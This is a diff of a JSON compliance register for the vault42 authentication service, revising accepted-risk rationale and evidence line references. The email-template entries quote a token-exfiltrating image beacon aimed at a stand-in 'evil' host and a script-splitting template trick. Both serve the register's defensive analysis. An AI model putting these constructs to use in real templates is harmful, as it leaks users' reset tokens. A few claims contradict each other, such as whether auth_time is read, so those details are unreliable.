@@ -143,8 +143,8 @@
       "accepted_on": "2026-08-10",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
       "rationale": "ASVS 5.0.0 V6.4.4 requires evidence of identity proofing at the same level as enrollment when a factor is lost. vault42 performs no identity proofing at enrollment, so there is no level to match; the requirement presumes an identity-proofing CSP that vault42 is not.",
-      "compensating_control": "Backup codes are issued at enrollment; beyond those, recovery requires the operator-held escrow, which needs a private key held offline and outside the system.",
-      "residual_risk": "Account recovery ultimately rests on operator process rather than on a technical proof of identity.",
+      "compensating_control": "There is less here than the earlier wording claimed, and the difference is the whole residual. Backup codes are not issued at enrollment: they come from an explicit POST /auth/2fa/backup-codes behind a recent-password confirmation, so a user who never asks has none. Email OTP is not a fallback either -- AuthService.emailOTPAllowed returns true only when the account has no strong method, so enrolling TOTP deliberately removes it. No admin route resets a user's MFA. The operator-held escrow is not an authenticator-loss path at all: it is written by account erasure and read by an offline tool that restores deleted users, and it needs a private key held outside the system.",
+      "residual_risk": "A user who loses every enrolled factor without having generated backup codes has no recovery path short of the operator deleting the account and letting them register again. Account recovery rests on operator process rather than on a technical proof of identity, which is what the requirement asks for and what an identity-proofing CSP would provide.",
       "revisit_when": "vault42 gains an identity-proofing step at enrollment.",
       "cost_of_closing": "Not applicable without an identity-proofing capability."
     },
@@ -154,9 +154,9 @@
       "accepted_by": "Project maintainer (vault42)",
       "accepted_on": "2026-08-10",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
-      "rationale": "A federated session is bound to vault42's own lifetime. vault42 does not record the IdP's auth_time or force reauthentication when the maximum interval since the IdP authentication event elapses.",
+      "rationale": "A federated session is bound to vault42's own lifetime. The ID token verifier at internal/oauth2/oidc_idtoken.go reads iss, aud, exp, nonce, sub, the profile claims and auth_time; sid appears nowhere in internal/oauth2, so there is no handle on the provider's session. The authentication instant is no longer the callback's own clock: internal/oauth2/oidc_idtoken.go reads the OIDC auth_time claim and internal/handler/oauth.go:650 passes it into the AuthContext, falling back to the callback instant only when the issuer asserted none. What is still missing is the enforcement half -- the IdP instant is not persisted on the refresh family, so no deadline is derived from it -- and the whole of termination, in either direction.\n\nClosing the lifetime half needs the IdP instant persisted on the refresh family, because rotation re-derives every deadline from the family origin -- clamping the first token's expiry would be undone at the first refresh. Closing the termination half needs an OIDC back-channel logout endpoint, which is a feature rather than a fix.",
       "compensating_control": "The vault42 session is independently bounded by its own refresh TTL, is revocable by the user and by an administrator, and re-checks account state on every rotation.",
-      "residual_risk": "A user whose IdP session was terminated upstream keeps their vault42 session until it expires or is revoked.",
+      "residual_risk": "Termination is unhandled in both directions, and the earlier wording named only one. A user whose IdP session was terminated upstream keeps their vault42 session until it expires or is revoked, which with the shipped defaults is up to 720 hours for a session that rotates at least hourly. In the other direction, AuthService.Logout revokes only vault42's own tokens, so a vault42 logout leaves the upstream IdP session live and the next federated sign-in completes without a prompt. V7.6.1 covers lifetime and termination between relying parties and identity providers without picking a direction.",
       "revisit_when": "A deployment federates to an IdP whose session policy is the authoritative one, such as a corporate SSO with mandatory reauthentication.",
       "cost_of_closing": "Record auth_time from the ID token and compare it on refresh."
     },
@@ -166,11 +166,11 @@
       "accepted_by": "Project maintainer (vault42)",
       "accepted_on": "2026-08-10",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
-      "rationale": "Hash chaining defends against an adversary who already holds database write access. Against that adversary a chain whose signing key lives in the same process is theatre: the adversary rewrites the rows and re-signs them. The honest version needs an off-box key and an off-system mirror, which is a deployment-topology commitment rather than a code change. Meanwhile the trigger and grant model already defeats the realistic adversary, a compromised vault_app role.",
+      "rationale": "The audit log is append-only in the database -- BEFORE-ROW triggers raise on UPDATE and DELETE, and vault_app holds SELECT and INSERT only -- but nothing detects a change made underneath those controls, and nothing leaves the box.\n\nAn unkeyed hash chain would be recomputable by the adversary it targets, so a bare prev_hash column is not worth shipping. That much stands. The earlier wording went further and said a chain whose key lives in the same process is theatre because the adversary rewrites the rows and re-signs them, and that is false for the topology this chart ships: Postgres runs as its own pod under vault_mig while the application pods hold vault_app and MASTER_KEY, so a database-level compromise is not an application compromise. A chain keyed off the existing root would detect interior edits and prefix deletions by a database-level adversary. It would not detect truncation of the tail, a table drop, or a rollback to an older consistent snapshot.\n\nThe earlier wording also said a chain without an off-system mirror would be worse than none because it implies a guarantee it does not provide. That is an interpretation worry, and this project disposes of harder ones in prose as a matter of routine -- AR-12 ships a purge bypass and says so, AR-13 ships a memory wipe that does not wipe and pins it with a test that fails the day it starts working. Holding this one row to a standard no other risk is held to was not a reason, it was a rationalisation for the schedule.\n\nThe schedule is still right, for a different reason. ASVS V16.4.3 is a transport requirement in its own words -- logs are securely transmitted to a logically separate system -- and a chain closes none of it. GDPR Art. 5(2) is accountability demonstrable to a supervisory authority, and a chain whose key the controller holds proves integrity to the controller. Only AU-9 is materially advanced by chaining alone.",
       "compensating_control": "audit.deny_modify() raises on UPDATE and DELETE; UPDATE and DELETE are revoked from vault_app; the one sanctioned deletion path is SECURITY DEFINER with a pinned search_path, EXECUTE revoked from PUBLIC, and the trigger re-enabled before it returns.",
-      "residual_risk": "An adversary holding database superuser access can rewrite history without leaving evidence in the log itself.",
-      "revisit_when": "1.1, together with an off-system mirror. A chain designed without one would be worse than none because it would imply a guarantee it does not provide.",
-      "cost_of_closing": "A prev-hash column, a signing key held outside the process, read-time verification, and a checkpoint scheme that survives retention pruning. The batch insert path at internal/repository/postgres/audit.go:50 breaks a naive prev-hash chain and is the hard part."
+      "residual_risk": "A database-level actor -- vault_mig, the PGDATA volume, a doctored restore, a shell in the Postgres pod -- can edit or delete audit rows with no trace, and no artifact in the repository would show it. There is no ordering column, no digest, no row count and no external copy, and reads are ordered by a timestamp the writing process assigned.\n\nTruncation is the part worth naming separately, because it survives even the full design: dropping the tail of the log is cheaper than editing the middle, and no chain detects it without an anchor held somewhere the adversary does not control.",
+      "revisit_when": "Split by half. The transport half (V16.4.3) revisits when an audit mirror ships behind a config flag, emitting each entry to the process log the way alert.LogSink already does, or when the deployment guide carries a supported off-box recipe. The integrity half (AU-9, Art. 5(2)) revisits at 1.1 with a chain keyed off the existing root, never with an unkeyed prev_hash column. Two cheaper steps come first and are prerequisites rather than alternatives: recording the retention purge in the log it purges, and anchoring a periodic digest of the last window as an audit row and a process-log line.",
+      "cost_of_closing": "Larger than the earlier estimate, and in different places. That estimate named the batch INSERT as the hard part; a batch is the easy case, one transaction over rows already in order, committing an unbroken segment atomically. The hard parts are the three default replicas plus the admin gateway, which rule out one global chain without a per-insert lock; the three synchronous Log paths that bypass the buffer and must each draw a link; the quarantine path, where a row the store refuses individually is discarded and becomes a permanent hole that has to be reported as a break rather than tolerated; and the retention purge, because a timestamp cutoff does not delete a per-chain prefix and a naive purge breaks the chain it leaves behind."
     },
     "CR-28": {
       "title": "Email verification changes state on a GET",
@@ -178,9 +178,9 @@
       "accepted_by": "Project maintainer (vault42)",
       "accepted_on": "2026-08-18",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
-      "rationale": "internal/server/server.go:490 mounts GET /auth/verify-email, and internal/handler/auth.go:298 mutates state on it by marking the address verified. ASVS V3.5.3 requires either a non-safe method or strict Sec-Fetch-* validation, and no Sec-Fetch-* header is read anywhere in the tree. The constraint is real rather than an oversight: the link is delivered by email and followed by a browser navigation, which is a GET, and turning it into a POST means an interstitial page the user must click through.",
-      "compensating_control": "The token is single-use and consumed atomically by a compare-and-delete, so a replayed or prefetched link verifies at most once; the token is high-entropy and short-lived; the effect is bounded to marking an address the operator already sent mail to as verified, and confers no session; the route is rate limited. This is the emailed-link pattern docs/security.md AR-1 already covers.",
-      "residual_risk": "A mail client, security scanner or link prefetcher that follows the link performs the verification without the user acting. Nothing else is reachable through the route.",
+      "rationale": "internal/server/server.go:546 mounts GET /auth/verify-email, and internal/handler/auth.go:298 mutates state on it by marking the address verified. ASVS V3.5.3 requires either a non-safe method or strict Sec-Fetch-* validation.\n\nThis entry previously said no Sec-Fetch-* header is read anywhere in the tree, and that was false: cmd/bridge/proxy.go:373 reads all three. docs/COMPLIANCE.md recorded the correction and it never propagated back here, which is how a register sentence outlives the fact it rests on. The accurate statement is narrower and still decides the row: no route served by the vault itself validates fetch metadata, and adding it here would not help, because the rule only has teeth if it rejects requests that carry no fetch metadata at all -- which is every non-browser client, including the curl in docs/api.md and both shipped SDKs.\n\nThe method flip is the honest remedy and is a breaking change to a published API: @vault42/vue ships the GET in its built output, and a pinned older SDK would start receiving 405. It is timed with an SDK major rather than dropped into a patch release.",
+      "compensating_control": "The token is single-use and consumed atomically by a get-and-delete -- Redis GETDEL, Postgres DELETE ... RETURNING, or the in-memory equivalent -- so a replayed or prefetched link verifies at most once, proven across replicas by the multi-replica end-to-end suite. The token is 256 bits from crypto/rand, stored hashed, and expires in 24 hours. The effect is bounded to marking an address the operator already sent mail to as verified: it confers no session and issues no token. The route is rate limited to 10 per hour per source address, and Referrer-Policy: no-referrer is set globally.",
+      "residual_risk": "A security scanner that executes JavaScript performs the verification without the user acting. The precision matters and the earlier wording did not have it: the link in the email is the SPA route /verify-email, not the API route, so a plain prefetcher or link scanner that follows the URL receives index.html and changes nothing. The mutation happens only when the page's script runs and calls the API itself, which a headless renderer of the SafeLinks class does. Anything fetching /auth/verify-email directly also mutates, and that URL is published as a copyable curl in docs/api.md.\n\nThe consequence is not cosmetic. email_verified gates password login and is one half of the test deciding whether a federated identity may attach to an existing local account, so the realistic harm is an attacker registering with somebody else's address and that person's mail scanner completing the verification. A user whose token a scanner consumed also sees \"link expired\" while being, in fact, verified. Nothing else is reachable through the route.",
       "revisit_when": "Any additional state change is added behind a GET route, or the verification link starts conferring a session rather than only marking an address verified.",
       "cost_of_closing": "Either an interstitial page that POSTs the token, or Sec-Fetch-Site validation on the route. TestASVS_V3_5_3_StateChangingGETMatchesWhatTheRegisterClaims fails when either lands."
     },
@@ -190,11 +190,11 @@
       "accepted_by": "Project maintainer (vault42)",
       "accepted_on": "2026-08-18",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
-      "rationale": "ASVS V3.5.4 wants separate applications on separate hostnames so the same-origin policy separates them. When VAULT_SERVE_FRONTEND is on, internal/server/server.go:875 mounts the embedded SPA at the catch-all route of the same server that answers /auth, /user and /client, so the two share an origin by construction and the policy separates nothing.",
-      "compensating_control": "VAULT_SERVE_FRONTEND is off by default (internal/config/config.go:527) and the chart ships it false (charts/vault/values.yaml), so the single-origin topology is opt-in; charts/vault/templates/frontend.yaml deploys the SPA as a separate nginx workload on its own hostname, which is the topology the requirement prefers and the one the chart documents; the session cookie is __Host- prefixed and SameSite=Strict, which does not depend on the origin split; the frontend CSP restricts script-src to 'self' with no unsafe-inline.",
+      "rationale": "ASVS V3.5.4 wants separate applications on separate hostnames so the same-origin policy separates them. When VAULT_SERVE_FRONTEND is on, internal/server/server.go:847 mounts the embedded SPA at the catch-all route of the same server that answers /auth, /user and /client, so the two share an origin by construction and the policy separates nothing.",
+      "compensating_control": "VAULT_SERVE_FRONTEND is off by default (internal/config/config.go:481) and the chart ships serveFrontend: false, so the single-origin topology is opt-in; the honeypot profile is the one place that forces it on. The Content-Security-Policy applied when the frontend is served names script-src 'self' with no unsafe-inline, so even in the shared-origin shape a script the SPA did not author does not execute.\n\nThe chart offers the separated topology rather than shipping it, and the earlier wording did not make that distinction: charts/vault/templates/frontend.yaml deploys the SPA as its own nginx workload, but frontend.enabled is false by default and the template carries no hostname of its own. The separate hostname comes from ingress.hosts, which the operator supplies. So the preferred topology is available and configured, not default.",
       "residual_risk": "An operator who enables the embedded frontend gives up the origin boundary between the SPA and the API, so an XSS in the SPA runs on the API's origin.",
       "revisit_when": "The embedded frontend becomes the default, or the SPA gains a surface that renders content it did not author.",
-      "cost_of_closing": "Nothing to build. Closing it means documenting the separate-hostname topology as the supported production shape and keeping VAULT_SERVE_FRONTEND for development and the honeypot profile."
+      "cost_of_closing": "Nothing to build. Closing it means documenting the separate-hostname topology as the supported production shape -- including that it takes frontend.enabled and an ingress host, neither of which is a default -- and keeping VAULT_SERVE_FRONTEND for development and the honeypot profile."
     },
     "CR-30": {
       "title": "Admin email HTML is validated by a bespoke allowlist, not by a sanitisation library",
@@ -202,11 +202,11 @@
       "accepted_by": "Project maintainer (vault42)",
       "accepted_on": "2026-08-18",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
-      "rationale": "ASVS V1.3.1 asks for a well-known and secure HTML sanitization library or framework feature. vault42 uses neither: it uses a validator written for this codebase, at internal/email/templates.go:249, and that is why this row is an accepted risk rather than Met. The validator has two stages. internal/email/templates.go:92 is a regex denylist over the template source, kept as a first gate because its errors name the construct. internal/email/template_guard.go:176 is the stage that holds the property: it renders the template with two canary data sets, requires the two bodies to be byte-identical once each render's own canaries are masked, and then walks the rendered document against an allowlist of the elements and attributes an HTML email may use. Until 2026-08-18 the denylist was the only stage, and it did not hold. It never named img, href or background, so the plainest exfiltration of all -- an image whose URL carries the live reset token, fetched the moment the recipient opens the mail -- passed it untouched. It also read the source rather than the rendered body, so a template action split any literal it did name: <scr{{\"ipt\"}}> contains no <script and html/template renders a working one. Filing this Not Applicable on \"no WYSIWYG editor and no untrusted HTML input\" skipped the fact that an HTML body does arrive in an HTTP request body and is stored and later compiled.",
+      "rationale": "ASVS V1.3.1 asks for a well-known and secure HTML sanitisation library or framework feature. vault42 uses neither: it uses a validator written for this codebase. The requirement names the library, not the property, and that is the gap this row records.\n\nThe validator is four stages, not the two this entry used to describe. A source-text denylist names the obvious constructs so its errors are readable. A parse-tree walk refuses control flow that branches on a secret, assignment of a secret to a variable, and any pipeline over a secret that is not verbatim -- this is the stage the earlier description omitted entirely, and it is the only one that catches a comparison oracle such as {{if eq .Code \"000000\"}}. A two-canary differential render then requires two different secrets to produce byte-identical output. Last, an allowlist walk over the rendered document refuses any element, attribute, URL scheme or CSS construct not on the list, and refuses a masked secret in any attribute other than the configured link, or inside any text run a mail client would linkify.",
       "compensating_control": "The route requires rbac.EmailWrite, which is a super_admin-tier permission, so the population that can reach it is the population that could rewrite the mail wholesale anyway; the same validator runs at admin write time (internal/adminapi/email.go:277) and again wherever a stored override is loaded (internal/email/branding.go:70), so a row that reached the table another way is still refused before it renders; the output is an email body rendered by a mail client, not a page on vault42's origin, so there is no same-origin context to reach; every write is audited.",
-      "residual_risk": "The validator is bespoke, so a gap in it is a gap nobody else is fuzzing. Its failure mode is chosen to make that survivable: it is an allowlist walked over the rendered document, and anything it cannot confidently tokenise is refused, so a gap costs an operator a template rather than costing a user their second factor. Two things it deliberately does not stop: a template may carry a hardcoded remote image, which is an open-tracking pixel that reveals when and from which IP the mail was opened but carries no secret; and a template may still be written to phish, which the same principal could do by rewriting the copy.",
+      "residual_risk": "The validator is bespoke, so a gap in it is a gap nobody else is fuzzing. That sentence is the sharpest thing in this entry and it names the one action that is actually available: a fuzz target over the guard, asserting the invariant rather than a verdict -- if a template is accepted, no rendered URL-bearing attribute and no linkifiable text run contains a canary secret. It costs no dependency and is the test a stripping sanitiser could not satisfy.",
       "revisit_when": "The template surface is opened to any role below super_admin, or an email template is ever rendered on vault42's own origin rather than delivered as mail.",
-      "cost_of_closing": "Replace the bespoke walker with an allowlist sanitiser such as bluemonday, configured for an email-safe element set, and keep the two-canary differential render in front of it -- the differential is what defeats a template action splitting a construct, and no HTML sanitiser does that job because no HTML sanitiser sees the template. The reason it has not been made is that bluemonday would be a new module dependency on a security library that today has five direct ones."
+      "cost_of_closing": "Measured rather than estimated, and the answer is that the change this entry used to prescribe is a regression.\n\nIt said to replace the document walk with bluemonday and keep the differential render in front, on the grounds that the differential defeats a construct split across a template action. The differential does not defeat the plain beacon: an img whose src is a constant host with the secret appended renders identically under both canaries once the secrets are masked, so the differential accepts it and only the walk's secret-in-attribute check rejects it. Implemented as written, the swap re-admits a split-CSS beacon and stops four of the shipped templates validating, because the guard masks secrets to control characters and no HTML sanitiser will round-trip a control-character sentinel -- it deletes the anchor that carries it. Entity normalisation defeats the reject-if-changed wrapper for the same reason.\n\nMore fundamentally a sanitiser strips and returns a string; it cannot refuse, and silently storing a different template than the administrator wrote is a worse failure for a service whose mail carries reset links. bluemonday also has no notion of a secret, so it leaves img src=\"https://evil/?t=LIVE-TOKEN\" untouched: it solves cross-site scripting, and this is not a cross-site scripting problem. It would add four modules against a policy that treats a new dependency as a security decision, and its call path reaches a known vulnerability in golang.org/x/net that the pull-request govulncheck would fail on.\n\nThere is no cheap way to close this row. The requirement asks for a named library and the named libraries do not do this job."
     },
     "CR-34": {
       "title": "The Redis cache link has no TLS option",
@@ -215,10 +215,10 @@
       "accepted_on": "2026-08-18",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace and defines a different risk under this number; the two lists are deliberately disjoint.",
       "rationale": "internal/redis/pool.go:184 dials TLS when Options.TLS is set, pinning tls.VersionTLS12 and verifying the server name. Nothing sets it. internal/cache/redis.go:19 builds the Options from address, password and database only; cache.NewCache passes no TLS argument, and no environment variable exists to supply one, so the branch is unreachable from any deployment. The cache link is therefore cleartext with no operator override, and it is the one connection in ASVS V12.3.1's own enumeration -- \"middleware, databases\" -- that vault42 does not encrypt now that the SMTP path fails closed. It carries the Redis AUTH password, sent on every new connection before any application traffic; rate-limit and lockout keys that embed client IP addresses and user identifiers; and the jti that binds a password-confirmation window. It does not carry the email one-time code, which is stored as an HMAC (internal/service/auth.go:1811).",
-      "compensating_control": "The chart deploys Redis as a workload beside vault and its NetworkPolicy admits port 6379 only from the vault pods, so the link is pod-to-pod inside one namespace rather than across a network the operator does not own; the same policy admits no egress to 443 at all. The AUTH secret is read from REDIS_PASS_FILE rather than the environment. Nothing durable transits the link: the cache holds short-TTL rate-limit counters, lockout markers, single-use challenge markers and an HMAC of the email one-time code, and every value that authorises anything is re-checked against the database or against a signed token before it is honoured.",
+      "compensating_control": "The AUTH secret is read from REDIS_PASS_FILE rather than from the environment, so it is not in the pod's environment block, and no cached value is a bearer credential: the email one-time code is stored as an HMAC rather than raw.\n\nThe network argument is weaker than the earlier wording claimed and the difference matters. That wording said the chart deploys Redis as a workload beside vault with a NetworkPolicy admitting 6379 only from the vault pods. The chart can do that, and by default does not: cache.backend is redis while redis.enabled is false, so the shipped production configuration expects a Redis the operator supplies and the chart hardens a workload it did not deploy. The NetworkPolicy survives only because the default address is a bare in-namespace Service name and the policies key off an app: redis label. An operator who repoints redis.addr at a managed cache gets no policy protection and is also blocked by vault's own egress rule, which is a configuration they have to notice.",
       "residual_risk": "An attacker on the pod network between vault and Redis reads the AUTH password and the cache traffic, which includes client IP addresses and user identifiers. With the password they hold the cache: clearing a lockout marker or a rate-limit counter removes the throttle in front of password and one-time-code guessing. One escalation is sharper than the rest -- an attacker who already holds a stolen access token can write the confirmation record for that token's jti, which removes the password re-entry in front of DELETE /user/identity. No cache value is a credential on its own, and the database link is separately encrypted.",
       "revisit_when": "Redis moves outside the pod network -- a managed cache, a shared cluster, a namespace under another team's policy -- or the cache starts holding a value that authorises something without a second check.",
-      "cost_of_closing": "A REDIS_TLS boolean and an optional server-name override on Config, threaded through cache.NewCache into the Options literal at internal/cache/redis.go:19. The dial path already exists at internal/redis/pool.go:184 and already pins tls.VersionTLS12, so internal/redis does not change. The chart then needs a Redis that terminates TLS, which is the part that is not a code change and is why this is scheduled rather than done."
+      "cost_of_closing": "Wrong in both directions in the earlier estimate, which said internal/redis does not change and that the chart needs a Redis capable of terminating TLS.\n\ninternal/redis does change for the realistic case. pool.go builds its tls.Config inline with MinVersion and ServerName and no RootCAs, so verification falls to the host trust store; the runtime image is distroless-static, which carries the public roots, so a publicly trusted Redis certificate would verify and an in-cluster issuer would not. A private CA therefore needs a new field on Options and a change to the dial path. Client certificates for mutual TLS are not representable at all today.\n\nThe image is not the obstacle. redis:7-alpine is built with TLS support and refuses to start only for want of a certificate, which was checked by running it. What the chart actually needs is certificate issuance, a port and NetworkPolicy move off 6379, and new probe arguments -- the liveness and readiness probes run a bare redis-cli ping, which fails against a TLS-only server and would put the pod in CrashLoopBackOff.\n\nThe change is also wider than the dial path: the chart wiring test refuses any environment variable internal/config reads that the chart cannot set, and the boolean registry test refuses an unregistered boolean, so REDIS_TLS cannot be added to the Go side alone."
     },
     "CR-35": {
       "title": "No OpenSSF Best Practices badge",
@@ -282,7 +282,7 @@
       "accepted_on": "2026-08-20",
       "security_md": "Register-scoped. docs/security.md owns the AR-nn namespace; the two lists are deliberately disjoint.",
       "rationale": "SSDF PO.5.2 asks that development endpoints be secured and hardened. The environments that build, test and release vault42 satisfy the sibling task PO.5.1 and are assertable here: every workflow job runs on a GitHub-hosted label, so each is a fresh virtual machine discarded afterwards, no self-hosted runner is registered, and release builds take no Actions cache. The endpoint where code is written is a personal machine, and its configuration is neither in the repository nor checkable by a reader with a clone of it. Claiming it hardened would be exactly the unverifiable assertion this register was restructured to remove, and claiming the task inapplicable would be false, since the endpoint exists and the task addresses it.",
-      "compensating_control": "Nothing signed on that machine is trusted on the strength of the machine. Release artifacts are signed by Sigstore against the release workflow's OIDC identity rather than by a key held locally, so a compromised workstation cannot produce a signature that verifies as a release. Commits reach main only through a pull request with eighteen required checks; direct pushes are refused; and the tag namespace is protected, so publishing a release takes a push a repository rule permits rather than local access alone. A compromised endpoint could still author malicious source, which is what CR-36 already records as unreviewed.",
+      "compensating_control": "Nothing signed on that machine is trusted on the strength of the machine. Release artifacts are signed by Sigstore against the release workflow's OIDC identity rather than by a key held locally, so a compromised workstation cannot produce a signature that verifies as a release. Commits reach main only through a pull request with thirteen required status checks; direct pushes are refused for everyone except an administrator, since enforce_admins is off; and the tag namespace is protected, so publishing a release takes a push a repository rule permits rather than local access alone. A compromised endpoint could still author malicious source, which is what CR-36 already records as unreviewed.",
       "residual_risk": "Source authored on a compromised development endpoint would pass every gate that checks how a change is built and released, because none of them check who wrote it or on what. The signing and provenance chain establishes that the release workflow built this commit, not that the commit was intended.",
       "revisit_when": "The project adopts a hardened, attestable development environment whose configuration is itself in the repository, or commit signing is required and enforced on main."
     }
@@ -516,7 +516,7 @@
       "status": "Accepted Risk",
       "evidence": [
         "internal/email/templates.go:249",
-        "internal/email/template_guard.go:176",
+        "internal/email/template_guard.go:182",
         "internal/adminapi/email.go:277"
       ],
       "tests": [],
@@ -1016,13 +1016,13 @@
       "evidence": [
         "internal/repository/postgres/refresh_token.go:142",
         "internal/service/auth.go:2498",
-        "internal/handler/oauth.go:657"
+        "internal/handler/oauth.go:675"
       ],
       "tests": [
         "TestASVS_V2_3_4_ConcurrentSessionCapIsLocked",
         "TestASVS_V2_3_4_EveryFamilyCreatingPathIsNamedByTheRegister"
       ],
-      "notes": "The concurrent-session cap is enforced as one unit of work on the paths that go through AuthService.storeRefreshToken: the new-family insert is issued through RefreshTokenRepository.CreateWithinCap, which counts the user's active families and inserts under a single per-user advisory lock, so simultaneous logins cannot each read the same free slot and overshoot the cap. A count-only pre-check still fails fast, and a login that loses the race is refused with the same too-many-sessions outcome. The path this row previously did not name is the social-login callback: internal/handler/oauth.go:641 calls CheckSessionLimit, a soft pre-check, and then inserts at :657 through the plain Create rather than CreateWithinCap, so two OAuth callbacks racing could each pass the pre-check and both insert. Two independent reviewers found the same gap; the evidence now names the path that was short rather than the two that were always fine. TestASVS_V2_3_4_EveryFamilyCreatingPathIsNamedByTheRegister enumerates every family-creating insert and requires this row to name any that does not use the capped insert, so the next one cannot be discovered by a reviewer instead of by CI."
+      "notes": "The concurrent-session cap is enforced as one unit of work on the paths that go through AuthService.storeRefreshToken: the new-family insert is issued through RefreshTokenRepository.CreateWithinCap, which counts the user's active families and inserts under a single per-user advisory lock, so simultaneous logins cannot each read the same free slot and overshoot the cap. A count-only pre-check still fails fast, and a login that loses the race is refused with the same too-many-sessions outcome. The path this row previously did not name is the social-login callback: internal/handler/oauth.go:686 calls CheckSessionLimit, a soft pre-check, and then inserts at :657 through the plain Create rather than CreateWithinCap, so two OAuth callbacks racing could each pass the pre-check and both insert. Two independent reviewers found the same gap; the evidence now names the path that was short rather than the two that were always fine. TestASVS_V2_3_4_EveryFamilyCreatingPathIsNamedByTheRegister enumerates every family-creating insert and requires this row to name any that does not use the capped insert, so the next one cannot be discovered by a reviewer instead of by CI."
     },
     {
       "standard": "OWASP ASVS",
@@ -2663,7 +2663,7 @@
       "requirement": "Verify that the presence and integrity of digital signatures on authentication assertions (for example on JWTs or SAML assertions) are always validated, rejecting any assertions that are unsigned or have invalid signatures.",
       "status": "Met",
       "evidence": [
-        "internal/oauth2/oidc_idtoken.go:57"
+        "internal/oauth2/oidc_idtoken.go:69"
       ],
       "tests": [
         "TestASVS_V10_5_4_IDTokenAudienceIsCheckedAgainstTheClientID",
@@ -2699,12 +2699,12 @@
       "evidence": [
         "internal/service/mfa.go:104",
         "internal/handler/oauth.go:601",
-        "internal/handler/oauth.go:631"
+        "internal/handler/oauth.go:649"
       ],
       "tests": [
         "TestASVS_V6_8_4_FederatedLoginAssumesTheMinimumAuthenticationStrength"
       ],
-      "notes": "Met on the fallback clause, which is the operative one here. vault42 consumes an upstream identity provider and asks it nothing about how the user was authenticated: no acr, amr or auth_time is read from any ID token. The requirement's final sentence prescribes exactly that case, and internal/handler/oauth.go:631 applies it -- the callback issues through NewAuthContext with MethodFederated as the only method and the user-verification flag clear. AALForMethods treats a provider assertion as a first factor and never as the possession factor that completes AAL2 (internal/service/mfa.go:104), so a federated-only session is stamped at the floor, urn:vault42:aal:1, and emits no amr value because RFC 8176 registers none for an assertion from another issuer. Strength above the floor has to be earned by a factor vault42 verified itself: an MFA-enrolled user still goes through IssueChallengeToken (internal/handler/oauth.go:601), which carries the federated first factor across rather than claiming a password. Previously an accepted risk, CR-21, on the sentence \"no acr, amr or aal claim is issued and AALForMethods has no non-test caller\"; both halves stopped being true in af780d7 and the row was not moved. What remains true and bounds the claim: vault42 does not verify an upstream acr even when the provider supplies one, which is safe only because the value it substitutes is always the minimum."
+      "notes": "Met on the fallback clause, which is the operative one here. vault42 consumes an upstream identity provider and asks it nothing about how the user was authenticated: no acr, amr or auth_time is read from any ID token. The requirement's final sentence prescribes exactly that case, and internal/handler/oauth.go:649 applies it -- the callback issues through NewAuthContext with MethodFederated as the only method and the user-verification flag clear. AALForMethods treats a provider assertion as a first factor and never as the possession factor that completes AAL2 (internal/service/mfa.go:104), so a federated-only session is stamped at the floor, urn:vault42:aal:1, and emits no amr value because RFC 8176 registers none for an assertion from another issuer. Strength above the floor has to be earned by a factor vault42 verified itself: an MFA-enrolled user still goes through IssueChallengeToken (internal/handler/oauth.go:601), which carries the federated first factor across rather than claiming a password. Previously an accepted risk, CR-21, on the sentence \"no acr, amr or aal claim is issued and AALForMethods has no non-test caller\"; both halves stopped being true in af780d7 and the row was not moved. What remains true and bounds the claim: vault42 does not verify an upstream acr even when the provider supplies one, which is safe only because the value it substitutes is always the minimum."
     },
     {
       "standard": "OWASP ASVS",
@@ -3035,12 +3035,13 @@
       "status": "Accepted Risk",
       "accepted_risk": "CR-22",
       "evidence": [
-        "internal/handler/oauth.go:450"
+        "internal/handler/oauth.go:650",
+        "internal/oauth2/oidc_idtoken.go"
       ],
       "tests": [
-        "TestASVS_V10_2_1_StateIsIntegrityProtectedAndSessionBound"
+        "TestASVS_V7_6_1_FederatedSessionLifetimeMatchesWhatTheRegisterClaims"
       ],
-      "notes": "vault42 does not track the identity provider's own session lifetime and does not force reauthentication when the maximum time since the IdP authentication event is reached; a federated session is bound to vault42's own lifetime only."
+      "notes": "Accepted as CR-22 for the termination half. The lifetime half moved in 1.0.3: the ID token verifier reads the OIDC auth_time claim and the callback passes it into the AuthContext, so a federated token dates the login to the instant the provider says it authenticated the user rather than to the instant the callback ran. An issuer that asserts none is conformant and falls back to the callback instant, which is the one moment this server can vouch for.\n\nWhat remains is termination, in both directions: no back-channel logout endpoint exists, so an IdP session ending upstream leaves the vault42 session running until its own deadline, and AuthService.Logout revokes only vault42's tokens, so a vault42 logout leaves the upstream session live.\n\nThe row previously named TestASVS_V10_2_1_StateIsIntegrityProtectedAndSessionBound, which asserts the OAuth state parameter is HMAC-signed and session-bound. That is a cross-site-request-forgery gate and would pass whether or not any of this were true, so the row was uncovered. It now names a coupling gate that fails if either half moves without the register moving with it."
     },
     {
       "standard": "OWASP ASVS",
@@ -3289,7 +3290,7 @@
       "status": "Met",
       "evidence": [
         "internal/crypto/jwt.go:28",
-        "internal/oauth2/oidc_idtoken.go:57"
+        "internal/oauth2/oidc_idtoken.go:69"
       ],
       "tests": [
         "TestASVS_V9_2_3_IssuerAndAudienceAreBound"
@@ -3683,7 +3684,7 @@
       "requirement": "Verify that the client (as the relying party) mitigates ID Token replay attacks. For example, by ensuring that the 'nonce' claim in the ID Token matches the 'nonce' value sent in the authentication request to the OpenID Provider (in OAuth2 refereed to as the authorization request sent to the authorization server).",
       "status": "Met",
       "evidence": [
-        "internal/oauth2/oidc_idtoken.go:83"
+        "internal/oauth2/oidc_idtoken.go:95"
       ],
       "tests": [
         "TestASVS_V10_5_1_EmptyExpectedNonceFailsClosed"
@@ -3734,7 +3735,7 @@
       "requirement": "Verify that the client validates that the ID Token is intended to be used for that client (audience) by checking that the 'aud' claim from the token is equal to the 'client_id' value for the client.",
       "status": "Met",
       "evidence": [
-        "internal/oauth2/oidc_idtoken.go:73"
+        "internal/oauth2/oidc_idtoken.go:85"
       ],
       "tests": [
